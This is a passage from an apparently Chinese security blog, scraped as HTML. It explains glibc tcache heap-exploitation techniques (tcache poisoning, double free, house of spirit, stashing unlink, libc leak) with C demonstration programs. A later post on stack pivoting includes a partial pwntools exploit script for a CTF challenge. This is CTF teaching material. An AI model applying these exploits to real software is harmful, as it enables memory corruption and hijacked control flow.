class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	<span class="comment">// disable buffering</span></span><br><span class="line">	setbuf(<span class="built_in">stdin</span>, <span class="literal">NULL</span>);</span><br><span class="line">	setbuf(<span class="built_in">stdout</span>, <span class="literal">NULL</span>);</span><br><span class="line">	<span class="keyword">size_t</span> stack_var;</span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">"The address we want malloc() to return is %p.\n"</span>, (<span class="keyword">char</span> *)&amp;stack_var);</span><br><span class="line">	</span><br><span class="line">	<span class="keyword">intptr_t</span> *a = <span class="built_in">malloc</span>(<span class="number">128</span>);</span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">"malloc(128): %p\n"</span>, a);</span><br><span class="line">	<span class="keyword">intptr_t</span> *b = <span class="built_in">malloc</span>(<span class="number">128</span>);</span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">"malloc(128): %p\n"</span>, b);</span><br><span class="line"></span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">"Freeing the buffers...\n"</span>);</span><br><span class="line">	<span class="built_in">free</span>(a);</span><br><span class="line">	<span class="built_in">free</span>(b);</span><br><span class="line">	sleep(<span class="number">0</span>);</span><br><span class="line">	b[<span class="number">0</span>] = (<span class="keyword">intptr_t</span>)&amp;stack_var;</span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">"Now the tcache list has [ %p -&gt; %p ].\n"</span>, b, &amp;stack_var);</span><br><span class="line"></span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">"1st malloc(128): %p\n"</span>, <span class="built_in">malloc</span>(<span class="number">128</span>));</span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">"Now the tcache list has [ %p ].\n"</span>, &amp;stack_var);</span><br><span class="line">	sleep(<span class="number">0</span>);</span><br><span class="line">	<span class="keyword">intptr_t</span> *c = <span class="built_in">malloc</span>(<span class="number">128</span>);</span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">"2nd malloc(128): %p\n"</span>, c);</span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">"We got the control\n"</span>);</span><br><span class="line"></span><br><span class="line">	assert((<span class="keyword">long</span>)&amp;stack_var == (<span class="keyword">long</span>)c);</span><br><span class="line">	<span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<blockquote>
<p>sleep()为断点</p>
</blockquote>
<p>先看第一个断点下</p>
<p><img src="/2021/03/08/tcache/image-20210314165503011.png" alt="image-20210314165503011"></p>
<p>第二个断点</p>
<p><img src="/2021/03/08/tcache/image-20210314165645714.png" alt="image-20210314165645714"></p>
<p>很明显，当我们再次分配时，那么就会分配走我们想要的地址。</p>
<h2 id="2-tcache-dup"><a href="#2-tcache-dup" class="headerlink" title="2.tcache dup"></a>2.tcache dup</h2><p>上面的是针对malloc，这个针对的是free</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;assert.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">"This file demonstrates a simple double-free attack with tcache.\n"</span>);</span><br><span class="line"></span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">"Allocating buffer.\n"</span>);</span><br><span class="line">	<span class="keyword">int</span> *a = <span class="built_in">malloc</span>(<span class="number">8</span>);</span><br><span class="line"></span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">"malloc(8): %p\n"</span>, a);</span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">"Freeing twice...\n"</span>);</span><br><span class="line">	<span class="built_in">free</span>(a);</span><br><span class="line">	<span class="built_in">free</span>(a);</span><br><span class="line">	sleep(<span class="number">0</span>);</span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">"Now the free list has [ %p, %p ].\n"</span>, a, a);</span><br><span class="line">	<span class="keyword">void</span> *b = <span class="built_in">malloc</span>(<span class="number">8</span>);</span><br><span class="line">	<span class="keyword">void</span> *c = <span class="built_in">malloc</span>(<span class="number">8</span>);</span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">"Next allocated buffers will be same: [ %p, %p ].\n"</span>, b, c);</span><br><span class="line">	sleep(<span class="number">0</span>);</span><br><span class="line">	assert((<span class="keyword">long</span>)b == (<span class="keyword">long</span>)c);</span><br><span class="line">	<span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>直接看第一次断点</p>
<p><img src="/2021/03/08/tcache/image-20210314213639524.png" alt="image-20210314213639524"></p>
<p>两个是在一个位置，为什么会这样？</p>
<p>我们可以来看一下<code>tcache_put</code>函数</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">static</span> __always_inline <span class="keyword">void</span></span><br><span class="line">tcache_put (mchunkptr chunk, <span class="keyword">size_t</span> tc_idx)</span><br><span class="line">&#123;</span><br><span class="line">  tcache_entry *e = (tcache_entry *) chunk2mem (chunk);<span class="comment">//释放的chunk</span></span><br><span class="line">  assert (tc_idx &lt; TCACHE_MAX_BINS);<span class="comment">//判断下标是否符合</span></span><br><span class="line">  <span class="comment">//链表的替换</span></span><br><span class="line">  e-&gt;next = tcache-&gt;entries[tc_idx];</span><br><span class="line">  tcache-&gt;entries[tc_idx] = e;</span><br><span class="line">  <span class="comment">//数量增加</span></span><br><span class="line">  ++(tcache-&gt;counts[tc_idx]);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>可以看到，这里知识简单的链表插入，它并没有进行判断。</p>
<p>之后直接进行申请，我们就可以拿到同一块地址的两个指针。</p>
<h2 id="3-tcache-house-of-spirit"><a href="#3-tcache-house-of-spirit" class="headerlink" title="3.tcache house of spirit"></a>3.tcache house of spirit</h2><p>tcache house of spirit这种利用方式是由于tcache_put()函数检查不严格造成的，在释放的时候没有检查被释放的指针是否真的是堆块的malloc指针，<strong>如果我们构造一个size符合tcache bin size的fake_chunk</strong>，那么理论上讲其实可以将任意地址作为chunk进行释放。</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;assert.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	setbuf(<span class="built_in">stdout</span>, <span class="literal">NULL</span>);</span><br><span class="line"></span><br><span class="line">	<span class="built_in">malloc</span>(<span class="number">1</span>);</span><br><span class="line">	<span class="keyword">unsigned</span> <span class="keyword">long</span> <span class="keyword">long</span> *a; <span class="comment">//pointer that will be overwritten</span></span><br><span class="line">	<span class="keyword">unsigned</span> <span class="keyword">long</span> <span class="keyword">long</span> fake_chunks[<span class="number">10</span>]; <span class="comment">//fake chunk region</span></span><br><span class="line"></span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">"This region contains one fake chunk. It's size field is placed at %p\n"</span>, &amp;fake_chunks[<span class="number">1</span>]);</span><br><span class="line">	sleep(<span class="number">0</span>);</span><br><span class="line">	fake_chunks[<span class="number">1</span>] = <span class="number">0x40</span>; <span class="comment">// this is the size</span></span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">"Now we will overwrite our pointer with the address of the fake region inside the fake first chunk, %p.\n"</span>, &amp;fake_chunks[<span class="number">1</span>]);</span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">"... note that the memory address of the *region* associated with this chunk must be 16-byte aligned.\n"</span>);</span><br><span class="line">	a = &amp;fake_chunks[<span class="number">2</span>];</span><br><span class="line">	<span class="built_in">free</span>(a);</span><br><span class="line">	sleep(<span class="number">0</span>);</span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">"Now the next malloc will return the region of our fake chunk at %p, which will be %p!\n"</span>, &amp;fake_chunks[<span class="number">1</span>], &amp;fake_chunks[<span class="number">2</span>]);</span><br><span class="line">	<span class="keyword">void</span> *b = <span class="built_in">malloc</span>(<span class="number">0x30</span>);</span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">"malloc(0x30): %p\n"</span>, b);</span><br><span class="line">	sleep(<span class="number">0</span>);</span><br><span class="line">	assert((<span class="keyword">long</span>)b == (<span class="keyword">long</span>)&amp;fake_chunks[<span class="number">2</span>]);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>还是比较好理解的。</p>
<p>我们来看一下第一次断点。</p>
<p><img src="/2021/03/08/tcache/image-20210314215452014.png" alt="image-20210314215452014"></p>
<p>第一次只有<code>tcache_perthread_struct</code>和我们申请的堆块</p>
<p>看第二次断点</p>
<p><img src="/2021/03/08/tcache/image-20210314215557280.png" alt="image-20210314215557280"></p>
<p>bins中出现了栈上的地址，这时我们分配一下，就可以拿到栈上的指针了。</p>
<p><img src="/2021/03/08/tcache/image-20210314215657530.png" alt="image-20210314215657530"></p>
<p>栈上的指针到手。</p>
<h2 id="4-tcache-stashing-unlink-attack"><a href="#4-tcache-stashing-unlink-attack" class="headerlink" title="4.tcache stashing unlink attack"></a>4.tcache stashing unlink attack</h2><p>首先从名字就可以看出这种方法与unlink有关，这种攻击利用的是tcache bin中有剩余（数量小于TCACHE_MAX_BINS）时，同大小的small bin会放进tcache中，这种情况可以使用calloc分配同大小堆块触发，因为calloc分配堆块时不从tcache bin中选取。在获取到一个smallbin中的一个chunk后，如果tcache任由足够空闲位置，会将剩余的smallbin挂进tcache中，在这个过程中只对第一个bin进行了完整性检查，后面的堆块的检查缺失。当攻击者可以修改一个small bin的bk时，就可以实现在任意地址上写一个libc地址。构造得当的情况下也可以分配fake_chunk到任意地址</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;assert.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span>&#123;</span><br><span class="line">    <span class="keyword">unsigned</span> <span class="keyword">long</span> stack_var[<span class="number">0x10</span>] = &#123;<span class="number">0</span>&#125;;</span><br><span class="line">    <span class="keyword">unsigned</span> <span class="keyword">long</span> *chunk_lis[<span class="number">0x10</span>] = &#123;<span class="number">0</span>&#125;;</span><br><span class="line">    <span class="keyword">unsigned</span> <span class="keyword">long</span> *target;</span><br><span class="line"></span><br><span class="line">    stack_var[<span class="number">3</span>] = (<span class="keyword">unsigned</span> <span class="keyword">long</span>)(&amp;stack_var[<span class="number">2</span>]);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"stack_var addr is:%p\n"</span>,&amp;stack_var[<span class="number">0</span>]);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"chunk_lis addr is:%p\n"</span>,&amp;chunk_lis[<span class="number">0</span>]);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"target addr is:%p\n"</span>,(<span class="keyword">void</span>*)target);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"You can see the value of fake_chunk-&gt;bk is:%p\n\n"</span>,(<span class="keyword">void</span>*)stack_var[<span class="number">3</span>]);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"Also, let's see the initial value of stack_var[4]:%p\n\n"</span>,(<span class="keyword">void</span>*)stack_var[<span class="number">4</span>]);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"Now we alloc 9 chunks with malloc.\n\n"</span>);</span><br><span class="line"></span><br><span class="line">    <span class="comment">//now we malloc 9 chunks</span></span><br><span class="line">    <span class="keyword">for</span>(<span class="keyword">int</span> i = <span class="number">0</span>;i &lt; <span class="number">9</span>;i++)&#123;</span><br><span class="line">        chunk_lis[i] = (<span class="keyword">unsigned</span> <span class="keyword">long</span>*)<span class="built_in">malloc</span>(<span class="number">0x90</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    sleep(<span class="number">0</span>);</span><br><span class="line">    <span class="keyword">for</span>(<span class="keyword">int</span> i = <span class="number">3</span>;i &lt; <span class="number">9</span>;i++)&#123;</span><br><span class="line">        <span class="built_in">free</span>(chunk_lis[i]);</span><br><span class="line">    &#125;</span><br><span class="line">    sleep(<span class="number">0</span>);</span><br><span class="line">    <span class="comment">//last tcache bin</span></span><br><span class="line">    <span class="built_in">free</span>(chunk_lis[<span class="number">1</span>]);</span><br><span class="line">    <span class="comment">//now they are put into unsorted bin</span></span><br><span class="line">    <span class="built_in">free</span>(chunk_lis[<span class="number">0</span>]);</span><br><span class="line">    <span class="built_in">free</span>(chunk_lis[<span class="number">2</span>]);</span><br><span class="line">    sleep(<span class="number">0</span>);</span><br><span class="line">    <span class="comment">//convert into small bin</span></span><br><span class="line"></span><br><span class="line">    <span class="built_in">malloc</span>(<span class="number">0xa0</span>);<span class="comment">// size &gt; 0x90</span></span><br><span class="line">    sleep(<span class="number">0</span>);</span><br><span class="line">    <span class="comment">//now 5 tcache bins</span></span><br><span class="line"></span><br><span class="line">    <span class="built_in">malloc</span>(<span class="number">0x90</span>);</span><br><span class="line">    <span class="built_in">malloc</span>(<span class="number">0x90</span>);</span><br><span class="line">    sleep(<span class="number">0</span>);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"Now we emulate a vulnerability that can overwrite the victim-&gt;bk pointer into fake_chunk addr: %p.\n\n"</span>,(<span class="keyword">void</span>*)stack_var);</span><br><span class="line"></span><br><span class="line">    <span class="comment">//change victim-&gt;bck</span></span><br><span class="line">    <span class="comment">/*VULNERABILITY*/</span></span><br><span class="line">    chunk_lis[<span class="number">2</span>][<span class="number">1</span>] = (<span class="keyword">unsigned</span> <span class="keyword">long</span>)stack_var;</span><br><span class="line">    <span class="comment">/*VULNERABILITY*/</span></span><br><span class="line"></span><br><span class="line">    <span class="comment">//trigger the attack</span></span><br><span class="line">    <span class="built_in">calloc</span>(<span class="number">1</span>,<span class="number">0x90</span>);</span><br><span class="line">    sleep(<span class="number">0</span>);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"Now our fake chunk has been put into tcache bin[0xa0] list. Its fd pointer now point to next free chunk: %p and the bck-&gt;fd has been changed into a libc addr: %p\n\n"</span>,(<span class="keyword">void</span>*)stack_var[<span class="number">2</span>],(<span class="keyword">void</span>*)stack_var[<span class="number">4</span>]);</span><br><span class="line"></span><br><span class="line">    <span class="comment">//malloc and return our fake chunk on stack</span></span><br><span class="line">    target = <span class="built_in">malloc</span>(<span class="number">0x90</span>);   </span><br><span class="line">    sleep(<span class="number">0</span>);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"As you can see, next malloc(0x90) will return the region our fake chunk: %p\n"</span>,(<span class="keyword">void</span>*)target);</span><br><span class="line"></span><br><span class="line">    assert(target == &amp;stack_var[<span class="number">2</span>]);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>具体来看一下这个过程，先看这三个地址。</p>
<p><img src="/2021/03/08/tcache/image-20210318152451146.png" alt="image-20210318152451146"></p>
<p>先c一下，6个放入tcache</p>
<p><img src="/2021/03/08/tcache/image-20210318153644695.png" alt="image-20210318153644695"></p>
<p>再c，观察bins结构</p>
<p><img src="/2021/03/08/tcache/image-20210318153928275.png" alt="image-20210318153928275"></p>
<p>c两下，可以看到两个tcache已经分配了</p>
<p><img src="/2021/03/08/tcache/image-20210318154115014.png" alt="image-20210318154115014"></p>
<p>可以看到栈上的地址已经上了cache链，直接分配就行了</p>
<p><img src="/2021/03/08/tcache/image-20210318154918326.png" alt="image-20210318154918326"></p>
<blockquote>
<p>为什么会这样？</p>
<p>先看这个smallbin的结构</p>
<p><img src="/2021/03/08/tcache/image-20210318164858035.png" alt="image-20210318164858035"></p>
<p>之后我们把2的bk指针改为栈上的地址。</p>
<p>calloc之后就成为了这样</p>
<p><img src="/2021/03/08/tcache/image-20210318165216882.png" alt="image-20210318165216882"></p>
<p>这里说明一下为什么要使用calloc进行申请chunk，这是<strong>因为calloc在申请chunk的时候不会从tcache bin中摘取空闲块</strong>，如果这里使用malloc的话就会直接从tcache bin中获得空闲块了。那么在calloc申请size为0xa0大小的chunk的时候就会直接从small bin中获取，那么由于small bin是FIFO先进先出机制，所以这里被重新启用的是chunk[0]</p>
<p>这个时候就到了前面理论部分描述的内容了：在获取到一个smallbin中的一个 chunk 后会如果 tcache 仍有足够空闲位置（tcache中有两个位置，chunk[2]和stack_var刚好够落在这两个位置），剩下的 smallbin 从最后一个 stack_var开始顺着bk链接到 tcachebin 中 ，在这个过程中<strong>只对第一个 chunk[2]进行了完整性检查，后面的stack_var的检查缺失</strong>。这样一来就造成上图的效果，stack_var就被挂进了tcache bin的链表中</p>
<p><strong>同时这里还写入了一个libc，位于0x00007fffffffded0+0x10</strong></p>
<p><img src="/2021/03/08/tcache/image-20210318174356049.png" alt="image-20210318174356049"></p>
</blockquote>
<h2 id="5-libc-leak"><a href="#5-libc-leak" class="headerlink" title="5.libc leak"></a>5.libc leak</h2><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">(<span class="keyword">int</span> argc , <span class="keyword">char</span>* argv[])</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">long</span>* t[<span class="number">7</span>];</span><br><span class="line">    <span class="keyword">long</span> *a=<span class="built_in">malloc</span>(<span class="number">0x100</span>);</span><br><span class="line">    <span class="keyword">long</span> *b=<span class="built_in">malloc</span>(<span class="number">0x10</span>);</span><br><span class="line"></span><br><span class="line">    <span class="comment">// make tcache bin full</span></span><br><span class="line">    <span class="keyword">for</span>(<span class="keyword">int</span> i=<span class="number">0</span>;i&lt;<span class="number">7</span>;i++)</span><br><span class="line">        t[i]=<span class="built_in">malloc</span>(<span class="number">0x100</span>);</span><br><span class="line">	sleep(<span class="number">0</span>);</span><br><span class="line">    <span class="keyword">for</span>(<span class="keyword">int</span> i=<span class="number">0</span>;i&lt;<span class="number">7</span>;i++)</span><br><span class="line">        <span class="built_in">free</span>(t[i]);</span><br><span class="line">	sleep(<span class="number">0</span>);</span><br><span class="line">    <span class="built_in">free</span>(a);</span><br><span class="line">	sleep(<span class="number">0</span>);</span><br><span class="line">    <span class="comment">// a is put in an unsorted bin because the tcache bin of this size is full</span></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"%p\n"</span>,a[<span class="number">0</span>]);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

        </div></article>
      <article class="post">
    <header class="post-header">
      <h1 class="post-title"><a class="post-link" href="/2021/03/06/house-of%E7%B3%BB%E5%88%97/">house of系列</a>
        </h1>

      <div class="post-meta">
        <span class="post-time">
          2021-03-06
        </span><span class="post-visits"
             data-url="/2021/03/06/house-of%E7%B3%BB%E5%88%97/"
             data-title="house of系列">
          Visits 0
        </span>
        </div>
    </header>

    <div class="post-content">The article has been encrypted, please enter your password to view.<br>
          <div class="read-more">
            <a href="/2021/03/06/house-of%E7%B3%BB%E5%88%97/" class="read-more-link">Read more..</a>
          </div>
        </div></article>
      <article class="post">
    <header class="post-header">
      <h1 class="post-title"><a class="post-link" href="/2021/03/05/malloc%E6%BA%90%E7%A0%81%E8%AF%A6%E8%A7%A3/">malloc源码详解</a>
        </h1>

      <div class="post-meta">
        <span class="post-time">
          2021-03-05
        </span><span class="post-visits"
             data-url="/2021/03/05/malloc%E6%BA%90%E7%A0%81%E8%AF%A6%E8%A7%A3/"
             data-title="malloc源码详解">
          Visits 0
        </span>
        </div>
    </header>

    <div class="post-content">The article has been encrypted, please enter your password to view.<br>
          <div class="read-more">
            <a href="/2021/03/05/malloc%E6%BA%90%E7%A0%81%E8%AF%A6%E8%A7%A3/" class="read-more-link">Read more..</a>
          </div>
        </div></article>
      <article class="post">
    <header class="post-header">
      <h1 class="post-title"><a class="post-link" href="/2021/03/02/%E6%A0%88%E8%BF%81%E7%A7%BB/">栈迁移</a>
        </h1>

      <div class="post-meta">
        <span class="post-time">
          2021-03-02
        </span><span class="post-visits"
             data-url="/2021/03/02/%E6%A0%88%E8%BF%81%E7%A7%BB/"
             data-title="栈迁移">
          Visits 0
        </span>
        </div>
    </header>

    <div class="post-content"><h1 id="0x01-基本原理"><a href="#0x01-基本原理" class="headerlink" title="0x01 基本原理"></a>0x01 基本原理</h1><p>call一个函数实际进行的操作</p>
<blockquote>
<p>push eip+4;</p>
<p>push ebp;</p>
<p>mov ebp,esp;</p>
</blockquote>
<p>以保护现场，避免执行完函数后堆栈不平衡或者找不到之前的入口地址。</p>
<p>在执行完函数后也会进行一系列对应的操作来还原现场<code>leave;ret;</code></p>
<p>这边的leave就相当于进入函数栈操作的逆过程。</p>
<blockquote>
<p>leave == mov esp,ebp; pop ebp;<br>ret == pop eip #弹出栈顶数据给eip寄存器</p>
</blockquote>
<p>这样如果能够控制栈空间到任意地址，那么我们就能利用ret来控制eip的数据了（栈顶数据）</p>
<h1 id="0x02-利用条件"><a href="#0x02-利用条件" class="headerlink" title="0x02 利用条件"></a>0x02 利用条件</h1><p>主要是为了解决栈溢出可以，但溢出空间大小不足的问题（如read函数的字节限制等）</p>
<p>所以我们就要通过控制ebp来绕过限制。</p>
<h1 id="0x03-如何利用"><a href="#0x03-如何利用" class="headerlink" title="0x03 如何利用"></a>0x03 如何利用</h1><p>要想控制程序流程，我们首要控制的就是eip的值，而eip是由ret来获取的。</p>
<p>在不改变eip的情况下，所以我们想到的就是改变ret前面的内容。</p>
<p>这里就产生一个思路，如果我们能控制ebp和esp到任意位置，那么eip不也就随意控制了吗？</p>
<ol>
<li>栈溢出覆盖ebp，到指定栈顶的位置</li>
<li>esp确定好位置，伪造eip即可</li>
</ol>
<h1 id="0x04-例题"><a href="#0x04-例题" class="headerlink" title="0x04 例题"></a>0x04 例题</h1><h2 id="printf打印栈地址"><a href="#printf打印栈地址" class="headerlink" title="printf打印栈地址"></a>printf打印栈地址</h2><h3 id="ciscn-2019-es-2"><a href="#ciscn-2019-es-2" class="headerlink" title="ciscn_2019_es_2"></a>ciscn_2019_es_2</h3><blockquote>
<p>打印只需要到ebp位置就可以</p>
</blockquote>
<p>比较基础的栈迁移的题目</p>
<p>我们只需要获取ebp就可以</p>
<p>这里需要调试一下才能看清楚情况</p>
<p><img src="/2021/03/02/%E6%A0%88%E8%BF%81%E7%A7%BB/image-20210302164451946.png" alt="image-20210302164451946"></p>
<p>两次输出 第一次获取栈地址 第二次直接构造</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python</span></span><br><span class="line"><span class="comment"># -*- coding:utf-8 -*-</span></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="comment">#from LibcSearcher import *</span></span><br><span class="line"><span class="comment">#context.os='linux'</span></span><br><span class="line">context.log_level=<span class="string">'debug'</span></span><br><span class="line"><span class="comment">#context.arch = elf.arch</span></span><br><span class="line"><span class="comment">#context.terminal = ['terminator', '-x', 'sh', '-c']</span></span><br><span class="line"></span><br><span class="line">s       = <span class="keyword">lambda</span> data               :p.send(str(data))</span><br><span class="line">sa      = <span class="keyword">lambda</span> delim,data         :p.sendafter(str(delim), str(data))</span><br><span class="line">sl      = <span class="keyword">lambda</span> data               :p.sendline(str(data))</span><br><span class="line">sla     = <span class="keyword">lambda</span> delim,data         :p.sendlineafter(str(delim), str(data))</span><br><span class="line">r       = <span class="keyword">lambda</span> num=<span class="number">4096</span>           :p.recv(num)</span><br><span class="line">ru      = <span class="keyword">lambda</span> delims, drop=<span class="literal">True</span>  :p.recvuntil(delims, drop)</span><br><span class="line">itr     = <span class="keyword">lambda</span>                    :p.interactive()</span><br><span class="line">uu32    = <span class="keyword">lambda</span> data               :u32(data.ljust(<span class="number">4</span>,<span class="string">'\0'</span>))</span><br><span class="line">uu64    = <span class="keyword">lambda</span> data               :u64(data.ljust(<span class="number">8</span>,<span class="string">'\0'</span>))</span><br><span class="line">leak    = <span class="keyword">lambda</span> name,addr          :log.success(<span class="string">'&#123;&#125; = &#123;:#x&#125;'</span>.format(name, addr))</span><br><span class="line">p = remote(<span class="string">"node3.buuoj.cn"</span>,<span class="number">28770</span>)</span><br><span class="line"><span class="comment">#p = process("./pwn3.1")</span></span><br><span class="line">elf = ELF(<span class="string">"./pwn3.1"</span>)</span><br><span class="line">sys = elf.sym[<span class="string">"system"</span>]</span><br><span class="line">main = elf.sym[<span class="string">"main"</span>]</span><br><span class="line">leave_ret = <span class="number">0x080484b8</span></span><br><span class="line">pld = <span class="string">"A"</span>*<span 